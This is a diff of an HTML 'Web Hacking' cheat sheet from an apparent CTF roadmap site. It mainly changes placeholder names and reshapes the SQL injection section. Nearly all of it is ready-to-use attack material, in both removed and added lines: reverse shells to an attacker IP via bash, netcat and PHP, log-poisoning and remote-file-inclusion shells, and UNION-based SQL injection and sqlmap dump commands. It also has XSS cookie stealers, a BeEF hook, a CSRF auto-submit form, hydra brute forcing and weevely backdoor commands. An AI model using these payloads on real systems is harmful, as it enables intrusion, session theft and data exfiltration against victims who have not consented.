@@ -61,9 +61,9 @@
     </li>
     <li class="toctree-l2"><a class="reference internal" href="#sql-injection-vulnerabilities">SQL Injection Vulnerabilities</a>
         <ul>
-    <li class="toctree-l3"><a class="reference internal" href="#manual-approach">Manual Approach</a>
+    <li class="toctree-l3"><a class="reference internal" href="#dbms-artefacts">DBMS Artefacts</a>
     </li>
-    <li class="toctree-l3"><a class="reference internal" href="#automated-approach">Automated Approach</a>
+    <li class="toctree-l3"><a class="reference internal" href="#sqli-bruteforce">SQLi BruteForce</a>
     </li>
         </ul>
     </li>
@@ -134,116 +134,90 @@
                 <h1 id="web-hacking">Web Hacking</h1>
 <h2 id="information-gathering">Information Gathering</h2>
 <ul>
-<li><a href="">Whois Lookup</a> ; <a href="">Netcracft Site Report</a> ; <a href="">Robtex DNS Lookup</a> ;</li>
-<li>Reverse DNS Lookup: <a href="">Bing</a> --&gt; <code>ip: {target_ip}</code> ;</li>
-<li>Maltego.</li>
+<li>Websites sources:<ul>
+<li><a href="https://whois.domaintools.com/">https://whois.domaintools.com/</a> ; </li>
+<li><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a> ;</li>
+<li><a href="https://www.robtex.com/dns-lookup/">https://www.robtex.com/dns-lookup/</a> ;</li>
+</ul>
+</li>
+<li>Softwares sources:<ul>
+<li>Maltego ; </li>
+<li>TheHarvester ;</li>
+<li>Recong-NG.</li>
+</ul>
+</li>
 </ul>
 <pre><code class="language-bash"># subdomains discovery
-python knockpy.py {domain}
+python knockpy.py DOMAIN
 
 # files and directories discovery
-dirb http://{domain}
+dirb http://DOMAIN
 </code></pre>
 <h2 id="file-upload-vulnerabilities">File Upload Vulnerabilities</h2>
 <pre><code class="language-bash"># create a reverse shell
-weevely generate {password} {rsh.php}
+weevely generate PASS RSH
 
 # run reverse shell after upload
-weevely http://{rsh_location} {password}
-  &gt; help
+weevely http://PATH_TO_UPLODED_RSH PASS
+    &gt; help
 </code></pre>
 <p>Bypass file upload filters using Burp: <code>rsh.jpg --&gt; upload --&gt; rsh.php</code> and <code>rsh.jpg --&gt; upload --&gt; rsh.php.jpg</code>.</p>
 <h2 id="code-execution-vulnerabilities">Code Execution Vulnerabilities</h2>
 <pre><code class="language-bash"># add some commands after the expected one
-{cmd} ; bash -i &gt;&amp; /dev/tcp/{atk_ip}/{atk_port} 0&gt;&amp;1
-{cmd} &amp;&amp; php -r '$sock=fsockopen(&quot;atk_ip&quot;, atk_port); exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);';
-{cmd} | nc -e /bin/sh {atk_ip} {atk_port}
+CMD ; bash -i &gt;&amp; /dev/tcp/ATK_IP/ATK_PORT 0&gt;&amp;1
+CMD &amp;&amp; php -r '$sock=fsockopen(&quot;ATK_IP&quot;, ATK_PORT); exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);';
+CMD | nc -e /bin/sh ATK_IP ATK_PORT
 </code></pre>
 <h2 id="local-file-inclusion-vulnerabilities">Local File Inclusion Vulnerabilities</h2>
-<p>Exploit <code>/proc/self/environ</code> file: Burp --&gt; Headers --&gt; UA: <code>&lt;? passthru("nc -e /bin/sh {atk_ip} {atk_port}"); ?&gt;</code>.</p>
-<p>Exploit <code>/var/log/auth.log</code> file: <code>ssh "&lt;? passthru(base64_decode('{nc_cmd_base64_encoded}')); ?&gt;"@{target_ip}</code>.</p>
+<p>Exploit <code>/proc/self/environ</code> file: Burp --&gt; Headers --&gt; UA: <code>&lt;? passthru("nc -e /bin/sh ATK_IP ATK_PORT"); ?&gt;</code>.</p>
+<p>Exploit <code>/var/log/auth.log</code> file: <code>ssh "&lt;? passthru(base64_decode('NC_CMD_BASE64_ENCODED')); ?&gt;"@TARGET_IP</code>.</p>
 <h2 id="remote-file-inclusion-vulnerabilities">Remote File Inclusion Vulnerabilities</h2>
 <pre><code class="language-bash"># create reverse shell
-echo '&lt;?php passthru(&quot;nc -e /bin/sh {atk_ip} {atk_port}&quot;); ?&gt;' &gt; {rsh.txt}
+echo '&lt;?php passthru(&quot;nc -e /bin/sh ATK_IP ATK_PORT&quot;); ?&gt;' &gt; RSH_PHP
 
 # include reverse shell from target
-curl http://{domain}/?page=http://{atk_ip}/{rsh.txt}
+curl http://DOMAIN/?page=http://ATK_IP/RSH_PHP
 
 # beautify a basic shell
 SHELL=/bin/sh script -q /dev/null
 </code></pre>
 <h2 id="sql-injection-vulnerabilities">SQL Injection Vulnerabilities</h2>
-<h3 id="manual-approach">Manual Approach</h3>
-<pre><code class="language-bash"># mysql basic connection
-mysql -u {user} -h {host} -p
-  &gt; show databases;
-  &gt; use {db};
-  &gt; show tables;
-
-# search for injection
-INPUT=&quot;blabla' ORDER BY 1000 %23&quot;
-
-# general login bypass
-INPUT=&quot;blabla' %23&quot;
-INPUT=&quot;blabla' OR 1=1 %23&quot;
-
-# try to get the columns number fetched
-INPUT=&quot;blabla' ORDER BY {x} %23&quot;
-
-# get displayed columns number
-INPUT=&quot;blabla' UNION SELECT 1,2,3,...{x} %23&quot;
-
-# get basic database info
-INPUT=&quot;blabla' UNION SELECT database(),version(),user(),...{x} %23&quot;
-
-# get tables names
-INPUT=&quot;blabla' UNION SELECT table_name,null,null,...{x} FROM information_schema.tables WHERE table_schema = {db} %23&quot;
-
-# get table columns
-INPUT=&quot;blabla' UNION SELECT column_name,null,null,...{x} %23 FROM information_schema.columns WHERE table_name = {table} %23&quot;
-
-# display a sepcific record from list whereas only one is expected
-INPUT=&quot;blabla' UNION ... LIMIT {row_number},1 %23&quot;
-
-# bypass keyword filters
-INPUT=&quot;blabla' uNiOn sElEcT ... %23&quot;
-INPUT=&quot;blabla' uNiOn+sElEcT+... %23&quot;
-INPUT=&quot;blabla' uNiOn/**/sElEcT/**/... %23&quot;
-
-# read file from SQL
-INPUT=&quot;blabla' UNION SELECT null, load_file('{file}') %23&quot;
-
-# write file from SQL
-INPUT=&quot;blabla' UNION SELECT null, '&lt;?php passthru(&quot;nc -e /bin/sh {atk_ip} {atk_port}&quot;); ?&gt;' INTO OUTFILE '{/tmp/rsh.php}' %23&quot;
-</code></pre>
-<h3 id="automated-approach">Automated Approach</h3>
+<h3 id="dbms-artefacts">DBMS Artefacts</h3>
+<ul>
+<li><strong>MySQL</strong>:<ul>
+<li>functions: <code>database()</code>, <code>version()</code>, <code>user()</code>, <code>load_file()</code> ;</li>
+<li>tables: <code>information_schema.tables</code>, <code>information_schema.columns</code>.</li>
+</ul>
+</li>
+</ul>
+<h3 id="sqli-bruteforce">SQLi BruteForce</h3>
 <pre><code class="language-bash"># get db names
-sqlmap -u &quot;{url_with_params}&quot; --dbs
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --dbs
 
 # get current user
-sqlmap -u &quot;{url_with_params}&quot; --current-user
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --current-user
 
 # get tables from database
-sqlmap -u &quot;{url_with_params}&quot; --tables -D {db}
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --tables -D DB_NAME
 
 # get columns from table
-sqlmap -u &quot;{url_with_params}&quot; --columns -T {table} -D {db}
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --columns -T {table} -D DB_NAME
 
 # dump table data
-sqlmap -u &quot;{url_with_params}&quot; --dump -T {table} -D {db}
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --dump -T {table} -D DB_NAME
 
 # get an os shell
-sqlmap -u &quot;{url_with_params}&quot; --os-shell
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --os-shell
 
 # get an sql shell
-sqlmap -u &quot;{url_with_params}&quot; --sql-shell
+sqlmap -u &quot;HOST_URL_WITH_PARAMS&quot; --sql-shell
 </code></pre>
 <h2 id="xss-vulnerabilities">XSS Vulnerabilities</h2>
 <pre><code class="language-html">&lt;!-- search for XSS --&gt;
 &lt;script&gt;alert(1);&lt;/script&gt;
 
 &lt;!-- create an HTML cookie catcher --&gt;
-&lt;svg onload=&quot;document.body.innerHTML=document.body.innerHTML.concat('&lt;img src=\'{catcher_site}'.concat(btoa(document.cookie)).concat('\' /&gt;'))&quot; /&gt;
+&lt;svg onload=&quot;document.body.innerHTML=document.body.innerHTML.concat('&lt;img src=\'CATCHER_SITE'.concat(btoa(document.cookie)).concat('\' /&gt;'))&quot; /&gt;
 
 &lt;!-- create a JS cookie catcher --&gt;
 &lt;script&gt;
@@ -252,7 +226,7 @@ sqlmap -u &quot;{url_with_params}&quot; --sql-shell
       var DONE = this.DONE || 4;
       if (this.readyState === DONE){
           var encoded = btoa(request.responseText);
-          document.location = '{catcher_site}?' + encoded;
+          document.location = 'CATCHER_SITE?' + encoded;
       }
   };
   request.open('GET', '/', true);
@@ -261,47 +235,46 @@ sqlmap -u &quot;{url_with_params}&quot; --sql-shell
 &lt;svg onload=&quot;eval(atob('{base64_encoded_payload}'))&quot; /&gt;
 
 &lt;!-- create an XSS reverse shell --&gt;
-&lt;img src=http://{atk_ip}/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'{atk_ip}'$IFS'{atk_port}')&gt;
+&lt;img src=http://ATK_IP/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'ATK_IP'$IFS'ATK_PORT')&gt;
 
 &lt;!-- hook target using BEEF --&gt;
-&lt;script src=&quot;http://{atk_ip}:3000/hook.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;http://ATK_IP:3000/hook.js&quot;&gt;&lt;/script&gt;
 </code></pre>
 <p>BEEF exploit --&gt; Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar.</p>
 <h2 id="csrf-vulnerabilities">CSRF Vulnerabilities</h2>
 <pre><code class="language-html">&lt;!-- create an hidden form to be submitted by the target --&gt;
-&lt;form id=&quot;csrf-form&quot; action=&quot;http://{full_path_to_form}&quot; method=&quot;post&quot; hidden&gt;
-  &lt;input name=&quot;{blabla}&quot; value=&quot;{blabla}&quot;&gt;
+&lt;form id=&quot;csrf-form&quot; action=&quot;http://PATH_TO_WEBSITE_WITH_MALICIOUS_FORM&quot; method=&quot;post&quot; hidden&gt;
+  &lt;input name=&quot;NAME&quot; value=&quot;VALUE&quot;&gt;
 &lt;/form&gt;
 &lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit();&lt;/script&gt;
 
 &lt;!-- create a link that redirect to a website hosting the csrf form --&gt;
-&lt;a href=&quot;https://{atk}.tiiny.site&quot;&gt;&lt;/a&gt;
+&lt;a href=&quot;https://ATK_TIINY_SITE&quot;&gt;&lt;/a&gt;
 </code></pre>
 <h2 id="brute-force-dictionnary-attack">Brute Force &amp; Dictionnary Attack</h2>
 <pre><code class="language-bash"># create a wordlist
-crunch {min} {max} {symbols} -t {pattern} -o {outfile}
+crunch MIN_LENGTH MAX_LENGTH SYMBOLS -t PATTERN -o OUTPUT_FILE
 
 # crack a post login form using the wordlist
-hydra {target_ip} -l {user} -P {wordlist} http-post-form &quot;/{path_to_login_form}:{user}=^USER^&amp;{password}=^PASS^:F={fail_login_msg}&quot;
+hydra TARGET_IP -l USER -P WORDLIST http-post-form &quot;/PATH_TO_LOGIN:USER=^USER^&amp;PASS=^PASS^:F=FAIL_MSG&quot;
 </code></pre>
 <h2 id="post-exploitation">Post Exploitation</h2>
-<pre><code class="language-bash"># escalate from basic reverse shell to weevely
-atk   &gt; weevely generate {passwd} {rsh.txt}
+<pre><code class="language-bash"># weaponize a strong web shell
+weevely generate PASS RSH_PHP
 
-target&gt; wget http://{atk_ip}/{rsh.txt}
-      &gt; mv {rsh.txt} {rsh.php}
+# upload rsh on the target
+wget http://ATK_IP/RSH_PHP
 
-atk   &gt; weevely http://{target_ip}/{rsh.php} {passwd}
-
-# advanced weevely usage
-&gt; help
-&gt; system-info
-&gt; shell-sh -vector {vect} {cmd}
-&gt; file_read -vector {vect} {file}
-&gt; file_download -vector {vect} {remote_path} {local_path}  
-&gt; file_upload -vector {vect} {local_path} ./{remote_path}  
-&gt; backdoor_reversetcp -vector {vect} {atk_ip} {atk_port}
-&gt; sql_dump -vector {vect} -host localhost -lpath {local_path} {db} {user} {passwd}
+# execute rsh
+weevely http://TARGET_IP/RSH_PHP PASS
+    &gt; help
+    &gt; system-info
+    &gt; shell-sh -vector VECTOR CMD
+    &gt; file_read -vector VECTOR FILE
+    &gt; file_download -vector VECTOR REMOTE_PATH LOCAL_PATH  
+    &gt; file_upload -vector VECTOR LOCAL_PATH ./REMOTE_PATH  
+    &gt; backdoor_reversetcp -vector VECTOR ATK_IP ATK_PORT
+    &gt; sql_dump -vector VECTOR -host localhost -lpath LOCAL_PATH DB_NAME USER PASS
 </code></pre>
               
             </div>
@@ -321,7 +294,7 @@ atk   &gt; weevely http://{target_ip}/{rsh.php} {passwd}
   <div role="contentinfo">
     <!-- Copyright etc -->
     
-      <p>Copyright &copy; 2021 <a href="https://ctf-roadmap.github.io/profile/">amorix</a>.</p>
+      <p>Copyright &copy; 2021 <a href="https://ctf-roadmap.github.io/author/">amorix</a>.</p>
     
   </div>
 
